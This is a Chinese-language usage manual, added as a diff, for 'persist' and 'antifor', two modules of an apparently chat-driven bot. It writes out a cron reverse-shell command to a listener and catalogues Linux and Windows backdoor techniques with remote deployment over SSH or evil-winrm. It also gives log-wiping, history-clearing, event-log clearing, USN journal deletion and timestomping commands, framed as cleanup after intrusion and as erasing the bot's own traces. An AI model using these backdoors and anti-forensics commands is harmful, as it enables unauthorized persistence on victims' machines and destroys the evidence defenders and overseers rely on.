@@ -1,0 +1,473 @@
+================================================================================
+persist & antifor 工具详细用法说明
+================================================================================
+生成时间: 2026-10-21
+源码位置: deepseek_bot/persistence.py, deepseek_bot/anti_forensics.py
+================================================================================
+
+目录:
+  一、persist 工具(持久化)
+    1.1 工具概述
+    1.2 参数说明
+    1.3 act 详解与示例
+    1.4 Linux 持久化技术清单(9种)
+    1.5 Windows 持久化技术清单(10种)
+    1.6 常见使用场景
+
+  二、antifor 工具(痕迹清理)
+    2.1 工具概述
+    2.2 参数说明
+    2.3 act 详解与示例
+    2.4 Linux 清理命令清单
+    2.5 Windows 清理命令清单
+    2.6 常见使用场景
+
+  三、工具依赖与安装
+
+
+================================================================================
+一、persist 工具(持久化)
+================================================================================
+
+1.1 工具概述
+--------------------------------------------------------------------------------
+persist 是持久化自动化引擎, 支持 Linux 和 Windows 双平台。
+功能: 生成持久化 payload → 远程部署 → 检测已有痕迹 → 清理。
+
+支持的 act:
+  - list           : 列出可用持久化技术
+  - gen            : 生成持久化 payload(只生成命令, 不执行)
+  - deploy         : 生成并远程部署到目标
+  - detect_linux   : 检测 Linux 目标已有持久化痕迹
+  - detect_windows : 检测 Windows 目标已有持久化痕迹
+
+
+1.2 参数说明
+--------------------------------------------------------------------------------
++------------+--------+--------+--------------------------------------------------+
+| 参数名     | 类型   | 必填   | 说明                                             |
++------------+--------+--------+--------------------------------------------------+
+| act        | string | 是     | 操作类型, 枚举: list/gen/deploy/detect_linux/    |
+|            |        |        | detect_windows                                   |
+| method     | string | 否     | 持久化技术名称, 如 cron_job/systemd_service 等   |
+| os         | string | 否     | 操作系统: linux(默认) / windows                  |
+| target     | string | 否     | 目标主机 IP 或域名(deploy/detect 时必填)         |
+| credential | string | 否     | 凭据, 格式 "用户名:密码"                         |
+| keyfile    | string | 否     | SSH 私钥路径(用于 Linux)                         |
+| lhost      | string | 否     | 反弹 shell 监听 IP(反弹型技术用)                 |
+| lport      | int    | 否     | 反弹 shell 监听端口, 默认 4444                   |
+| interval   | string | 否     | 定时任务间隔(预留参数)                           |
++------------+--------+--------+--------------------------------------------------+
+
+
+1.3 act 详解与示例
+--------------------------------------------------------------------------------
+
+【act = list】列出可用持久化技术
+
+  用途: 查看当前 OS 支持哪些持久化技术及其风险等级/隐蔽度/是否需要 root
+
+  参数:
+    - os: linux / windows (默认 linux)
+
+  示例(对话中说):
+    "列出 linux 可用的持久化技术"
+    "列出 windows 的持久化方法"
+
+  返回示例:
+    [
+      {"method": "cron_job", "description": "Cron 每分钟反弹 shell",
+       "risk": "medium", "stealth": 3, "requires_root": false},
+      {"method": "ssh_authorized_key", "description": "写入 SSH 公钥",
+       "risk": "low", "stealth": 8, "requires_root": false},
+      ...
+    ]
+
+
+【act = gen】生成持久化 payload
+
+  用途: 只生成命令, 不执行。用于人工审核或复制到目标执行。
+
+  参数:
+    - method: 技术名(必填, 见 1.4/1.5 清单)
+    - os: linux / windows
+    - lhost: 反弹监听 IP(反弹型技术必填)
+    - lport: 反弹监听端口, 默认 4444
+
+  示例:
+    "用 cron_job 生成一个 linux 持久化 payload, 反弹到 10.0.0.1:4444"
+    "生成 windows registry_run 持久化命令"
+
+  返回示例:
+    {
+      "method": "cron_job",
+      "description": "Cron 每分钟反弹 shell",
+      "command": "echo \"* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'\" | crontab -",
+      "cleanup": "crontab -r 2>/dev/null; ...",
+      "risk": "medium",
+      "stealth": 3
+    }
+
+
+【act = deploy】生成并远程部署
+
+  用途: 自动通过 SSH(Linux) 或 evil-winrm(Windows) 部署到目标。
+
+  参数:
+    - target: 目标 IP(必填)
+    - method: 技术名(必填)
+    - os: linux / windows
+    - credential: "用户名:密码" 或留空走 SSH 密钥
+    - keyfile: SSH 私钥路径
+    - lhost / lport: 反弹参数
+
+  示例:
+    "把 cron_job 持久化部署到 192.168.1.100, 用户 root, 密码 Passw0rd, 反弹到 10.0.0.1:4444"
+    "用 systemd_service 部署到 192.168.1.100, 用密钥 /root/.ssh/id_rsa"
+
+  返回示例:
+    {"status": "ok", "stdout": "...", "stderr": "..."}
+    或
+    {"status": "not_installed", "hint": "安装: apt install openssh-client"}
+
+
+【act = detect_linux】检测 Linux 持久化痕迹
+
+  用途: 检查目标是否已被植入持久化(蓝队排查/红队自检)。
+
+  参数:
+    - target: 目标 IP(必填)
+    - credential: "用户名:密码"
+    - keyfile: SSH 私钥路径
+
+  检测项(10项):
+    crontab / cron_d / authorized_keys / bashrc / profile_d /
+    systemd / ld_preload / motd / at_jobs / lsmod_rootkit
+
+  示例:
+    "检测 192.168.1.100 的持久化痕迹, root/密码123456"
+
+
+【act = detect_windows】检测 Windows 持久化痕迹
+
+  用途: 检查 Windows 目标的持久化痕迹。
+
+  参数:
+    - target: 目标 IP(必填)
+    - credential: "用户名:密码"
+
+  检测项(10项):
+    run_keys / run_hklm / runonce / scheduled_tasks / services /
+    startup_folder / sticky_keys / ifeo / winlogon / wmi_events
+
+  示例:
+    "检测 192.168.1.200 的 Windows 持久化痕迹, administrator/P@ssw0rd"
+
+
+1.4 Linux 持久化技术清单(9种)
+--------------------------------------------------------------------------------
++----------------------+----------------------------------+--------+--------+----------+
+| method               | 说明                             | 风险   | 隐蔽度 | 需 root  |
++----------------------+----------------------------------+--------+--------+----------+
+| cron_job             | Cron 每分钟反弹 shell            | medium | 3/10   | 否       |
+| ssh_authorized_key   | 写入 SSH 公钥到 authorized_keys  | low    | 8/10   | 否       |
+| systemd_service      | Systemd 服务持久化               | high   | 6/10   | 是       |
+| bashrc_backdoor      | ~/.bashrc 后门(登录触发)         | low    | 5/10   | 否       |
+| profile_d_script     | /etc/profile.d/ 全局脚本         | medium | 7/10   | 是       |
+| ld_preload_hijack    | LD_PRELOAD 库劫持                | high   | 9/10   | 是       |
+| at_job               | at 定时任务                      | medium | 6/10   | 否       |
+| kernel_module        | 内核模块 rootkit                 | high   | 10/10  | 是       |
+| motd_backdoor        | MOTD 更新脚本后门                | medium | 8/10   | 是       |
++----------------------+----------------------------------+--------+--------+----------+
+
+  注: 隐蔽度 1-10, 越高越隐蔽。反弹型技术需要 lhost/lport 参数。
+
+
+1.5 Windows 持久化技术清单(10种)
+--------------------------------------------------------------------------------
++----------------------------+----------------------------------+--------+--------+----------+
+| method                     | 说明                             | 风险   | 隐蔽度 | 需 root  |
++----------------------------+----------------------------------+--------+--------+----------+
+| registry_run               | 注册表 HKCU Run 启动项           | low    | 4/10   | 否       |
+| (HKLM 版)                  | 注册表 HKLM Run 启动项           | medium | 4/10   | 是       |
+| scheduled_task             | 计划任务(每小时触发)             | medium | 5/10   | 否       |
+| windows_service            | Windows 服务                     | high   | 6/10   | 是       |
+| wmi_event_subscription     | WMI 事件订阅(隐蔽)               | high   | 9/10   | 是       |
+| sticky_keys                | 粘滞键后门(5次Shift弹cmd)        | high   | 3/10   | 是       |
+| ifeo_debugger              | IFEO 调试器劫持                  | medium | 7/10   | 是       |
+| startup_folder             | 启动文件夹快捷方式               | low    | 3/10   | 否       |
+| winlogon_helper            | Winlogon Helper DLL              | high   | 8/10   | 是       |
+| bits_job                   | BITS 后台传输任务                | medium | 8/10   | 否       |
++----------------------------+----------------------------------+--------+--------+----------+
+
+  注: Windows 技术通过 evil-winrm 远程执行, 需要安装 evil-winrm。
+
+
+1.6 常见使用场景
+--------------------------------------------------------------------------------
+
+场景1: 获取 shell 后留后门
+  → persist act=gen method=ssh_authorized_key os=linux
+  → 人工把公钥写入目标 authorized_keys
+  → 或者直接 persist act=deploy method=cron_job target=IP credential=root:pass lhost=你的IP lport=4444
+
+场景2: 蓝队自查
+  → persist act=detect_linux target=本机IP credential=user:pass
+
+场景3: 红队评估隐蔽性
+  → persist act=list os=linux (看哪些技术不需要 root 且隐蔽度高)
+  → persist act=list os=windows
+
+
+================================================================================
+二、antifor 工具(痕迹清理)
+================================================================================
+
+2.1 工具概述
+--------------------------------------------------------------------------------
+antifor 是反取证/痕迹清理引擎, 支持 Linux 和 Windows。
+功能: 清理命令历史 / 清空系统日志 / 篡改文件时间戳 / 安全删除文件 /
+      清理 Windows 事件日志/Prefetch/最近文档/回收站/USN Journal。
+
+支持的 act:
+  - history     : 清理命令历史
+  - logs        : 清理系统日志
+  - all_linux   : 一键清理所有 Linux 痕迹(history + logs)
+  - timestamp   : 篡改文件时间戳
+  - shred       : 安全删除文件(3次随机覆盖)
+  - winlogs     : 清空 Windows 事件日志
+  - prefetch    : 清理 Windows Prefetch
+  - recent      : 清理最近文档 + 回收站
+  - all_windows : 一键清理所有 Windows 痕迹
+  - local       : 清理本地 bot 服务器痕迹
+
+
+2.2 参数说明
+--------------------------------------------------------------------------------
++------------+--------+--------+--------------------------------------------------+
+| 参数名     | 类型   | 必填   | 说明                                             |
++------------+--------+--------+--------------------------------------------------+
+| act        | string | 是     | 操作类型, 见上方枚举                             |
+| target     | string | 否     | 目标主机 IP, 为空=在本地(bot服务器)执行          |
+| credential | string | 否     | 凭据, 格式 "用户名:密码"                         |
+| keyfile    | string | 否     | SSH 私钥路径(Linux 远程时用)                     |
+| path       | string | 否     | 文件路径(timestamp / shred 时必填)               |
++------------+--------+--------+--------------------------------------------------+
+
+  远程执行说明:
+    - Linux 远程: 通过 SSH, 需要 ssh 客户端; 有密码时自动用 sshpass
+    - Windows 远程: 通过 evil-winrm, 需要 gem install evil-winrm
+    - 本地执行: target 留空, 直接在 bot 运行的服务器上执行
+
+
+2.3 act 详解与示例
+--------------------------------------------------------------------------------
+
+【act = history】清理命令历史
+
+  用途: 清空 bash/zsh/python/mysql/psql 的 history 文件。
+
+  执行的命令:
+    history -c
+    history -w
+    rm -f ~/.bash_history ~/.zsh_history ~/.python_history ...
+    export HISTSIZE=0
+    export HISTFILE=/dev/null
+
+  参数: target / credential / keyfile (可选, 远程时用)
+
+  示例:
+    "清理本机的命令历史"
+    "清理 192.168.1.100 的命令历史, root/密码123"
+
+
+【act = logs】清理系统日志
+
+  用途: 清空 wtmp/btmp/syslog/auth.log/messages/secure/journalctl/lastlog。
+
+  执行的命令:
+    > /var/log/wtmp
+    > /var/log/btmp
+    > /var/log/syslog
+    > /var/log/auth.log
+    find /var/log -type f -name '*.log' -exec truncate -s 0 {} \;
+    journalctl --rotate && journalctl --vacuum-time=1s
+    > /var/log/lastlog
+
+  示例:
+    "清理 192.168.1.100 的系统日志"
+    "清空本机所有日志"
+
+
+【act = all_linux】一键清理所有 Linux 痕迹
+
+  用途: 执行 history + logs 全部清理命令。
+
+  参数: target / credential / keyfile
+
+  示例:
+    "一键清理 192.168.1.100 的所有痕迹, root/密码123"
+
+
+【act = timestamp】篡改文件时间戳
+
+  用途: 把文件的访问/修改时间改为 2020-01-01 00:00:00。
+
+  参数:
+    - path: 文件路径(必填)
+    - target / credential / keyfile (可选)
+
+  执行命令: touch -t 202001010000.00 {filepath}
+
+  示例:
+    "把 /tmp/sensitive.txt 的时间戳改掉"
+    "篡改 192.168.1.100 上 /var/log/auth.log 的时间戳"
+
+
+【act = shred】安全删除文件
+
+  用途: 用 shred 3次随机覆盖后删除文件, 无法恢复。
+        shred 未安装时回退到 dd 覆盖 + rm。
+
+  参数:
+    - path: 文件路径(必填)
+    - target / credential / keyfile (可选)
+
+  执行命令:
+    shred -u -z -n 3 {filepath}    (有 shred 时)
+    dd if=/dev/urandom of={filepath} bs=1M count=1; rm -f {filepath}  (回退)
+
+  示例:
+    "安全删除 /tmp/sensitive.txt"
+    "用 shred 删掉 192.168.1.100 上的 /root/.bash_history"
+
+
+【act = winlogs】清空 Windows 事件日志
+
+  用途: 清空 Security/System/Application 等所有事件日志。
+
+  执行的命令:
+    for /F "tokens=*" %1 in ('wevtutil el') do wevtutil cl "%1"
+    wevtutil cl Security
+    wevtutil cl System
+    wevtutil cl Application
+
+  参数: target / credential (Windows 目标必填)
+
+  示例:
+    "清空 192.168.1.200 的事件日志, administrator/Pass"
+
+
+【act = prefetch】清理 Windows Prefetch
+
+  用途: 删除 C:\Windows\Prefetch\ 下所有文件。
+
+  执行命令: del /f /q C:\Windows\Prefetch\*.*
+
+  示例: "清理 192.168.1.200 的 Prefetch"
+
+
+【act = recent】清理最近文档 + 回收站
+
+  用途: 清空最近文档列表、运行历史、回收站。
+
+  执行的命令:
+    del /f /q "%APPDATA%\Microsoft\Windows\Recent\*.*"
+    reg delete HKCU\...\RunMRU /f
+    powershell -c "Clear-RecycleBin -Force"
+
+  示例: "清理 192.168.1.200 的最近文档和回收站"
+
+
+【act = all_windows】一键清理所有 Windows 痕迹
+
+  用途: 执行事件日志 + Prefetch + 最近文档 + 回收站 + USN Journal 全部清理。
+
+  示例: "一键清理 192.168.1.200 的所有痕迹"
+
+
+【act = local】清理本地 bot 服务器痕迹
+
+  用途: 清理 bot 运行服务器上的痕迹(无需 target)。
+        删除 ~/.bash_history, ~/.zsh_history, 清理 /tmp 下的工具输出。
+
+  示例: "清理本机痕迹"
+
+
+2.4 Linux 清理命令清单
+--------------------------------------------------------------------------------
++----------+----------------+----------------------------------------------+
+| act      | 清理项         | 执行的命令                                   |
++----------+----------------+----------------------------------------------+
+| history  | bash_history   | rm -f ~/.bash_history                        |
+| history  | zsh_history    | rm -f ~/.zsh_history                         |
+| history  | python_history | rm -f ~/.python_history                      |
+| history  | mysql_history  | rm -f ~/.mysql_history                       |
+| history  | 禁用记录       | export HISTSIZE=0; HISTFILE=/dev/null        |
+| logs     | wtmp(登录)     | > /var/log/wtmp                              |
+| logs     | btmp(失败登录) | > /var/log/btmp                              |
+| logs     | syslog         | > /var/log/syslog                            |
+| logs     | auth.log       | > /var/log/auth.log                          |
+| logs     | journalctl     | journalctl --vacuum-time=1s                  |
+| logs     | lastlog        | > /var/log/lastlog                           |
+| timestamp| 文件时间戳     | touch -t 202001010000.00 {file}              |
+| shred    | 安全删除       | shred -u -z -n 3 {file}                      |
++----------+----------------+----------------------------------------------+
+
+
+2.5 Windows 清理命令清单
+--------------------------------------------------------------------------------
++----------+----------------+----------------------------------------------+
+| act      | 清理项         | 执行的命令                                   |
++----------+----------------+----------------------------------------------+
+| winlogs  | 所有事件日志   | wevtutil cl {日志名}                         |
+| winlogs  | Security日志   | wevtutil cl Security                         |
+| prefetch | Prefetch       | del /f /q C:\Windows\Prefetch\*.*            |
+| recent   | 最近文档       | del "%APPDATA%\...\Recent\*.*"               |
+| recent   | 运行历史       | reg delete ...\RunMRU /f                     |
+| recent   | 回收站         | Clear-RecycleBin -Force                      |
+| all      | USN Journal    | fsutil usn deletejournal /d C:               |
++----------+----------------+----------------------------------------------+
+
+
+2.6 常见使用场景
+--------------------------------------------------------------------------------
+
+场景1: 完成渗透后清理痕迹
+  → antifor act=all_linux target=目标IP credential=root:pass
+  → 或 antifor act=all_windows target=目标IP credential=admin:pass
+
+场景2: 删除敏感文件
+  → antifor act=shred path=/tmp/sensitive_data.txt
+
+场景3: 篡改日志时间戳躲避检测
+  → antifor act=timestamp path=/var/log/auth.log
+
+场景4: 清理 bot 自己的操作痕迹
+  → antifor act=local
+
+
+================================================================================
+三、工具依赖与安装
+================================================================================
+
+persist 依赖:
+  - ssh (Linux 远程部署/检测): apt install openssh-client
+  - sshpass (密码登录, 可选): apt install sshpass
+  - evil-winrm (Windows 远程): gem install evil-winrm
+
+antifor 依赖:
+  - ssh (Linux 远程): apt install openssh-client
+  - sshpass (密码登录, 可选): apt install sshpass
+  - evil-winrm (Windows 远程): gem install evil-winrm
+  - shred (安全删除, 可选): 系统自带, 未安装时自动回退 dd
+
+检测工具是否安装:
+  → tools act=detect tool=ssh
+  → tools act=detect tool=evil-winrm
+  → tools act=missing  (列出所有未安装工具)
+
+
+================================================================================
+文档结束
+================================================================================
